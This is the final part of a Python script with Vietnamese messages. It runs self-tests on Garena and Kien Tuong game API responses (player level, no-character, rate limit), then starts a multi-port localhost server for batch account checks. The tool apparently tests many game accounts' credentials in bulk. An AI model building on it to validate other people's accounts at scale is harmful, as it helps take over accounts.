            raise SystemExit("SELF-TEST FAIL: empty Kien Tuong data accepted")
        if not kientuong_player_has_level({
            "ok": True,
            "body": {"data": {"player": {"level": 12}}},
        }):
            raise SystemExit("SELF-TEST FAIL: valid Kien Tuong level rejected")
        if not kientuong_no_character_response({"ok": False, "status": 422, "body": {}}):
            raise SystemExit("SELF-TEST FAIL: no-character response rejected")
        if kientuong_no_character_response({"ok": False, "status": 429, "body": {}}):
            raise SystemExit("SELF-TEST FAIL: rate limit treated as no character")
        if configured_server_ports([5555, 5556, 5555]) != [5555, 5556]:
            raise SystemExit("SELF-TEST FAIL: repeated HTTP ports")
        if configured_server_ports(None, ports_env="5555, 6000") != [5555, 6000]:
            raise SystemExit("SELF-TEST FAIL: PORTS parsing")
        print("SELF-TEST OK: TCP module và localhost handler đã nạp.");return 0
    csrf=secrets.token_urlsafe(32)
    batch_state=BatchServerState()
    servers: list[ApiTestServer] = []
    try:
        for port in ports:
            servers.append(ApiTestServer(
                (host,port),Handler,tcp_module,csrf,args.timeout,batch_state=batch_state
            ))
    except OSError as exc:
        for bound_server in servers:
            bound_server.server_close()
        raise SystemExit(f"Không mở được cổng {port}: {exc}") from exc
    display_host="127.0.0.1" if host in ("0.0.0.0","::","") else host
    urls=[f"http://{display_host}:{server.server_port}/" for server in servers]
    print("Kiểm tra Garena + Kiện Tướng đang nghe tại:")
    for url in urls:
        print(f"  {url}")
    print("Các cổng dùng chung kết quả batch. Ctrl+C để dừng; credential/token không được ghi log.")
    headless=args.no_browser or is_render or host not in ("127.0.0.1","localhost")
    if not headless:threading.Timer(.25,tcp_ui.open_chrome_or_default,args=(urls[0],)).start()
    extra_threads = [
        threading.Thread(
            target=server.serve_forever,
            kwargs={"poll_interval": .25},
            daemon=True,
            name=f"http-port-{server.server_port}",
        )
        for server in servers[1:]
    ]
    for thread in extra_threads:
        thread.start()
    try:servers[0].serve_forever(poll_interval=.25)
    except KeyboardInterrupt:print("\nĐã dừng server test.")
    finally:
        for server in servers[1:]:
            server.shutdown()
        for server in servers:
            server.server_close()
        for thread in extra_threads:
            thread.join(timeout=5)
    return 0


if __name__=="__main__":raise SystemExit(main())
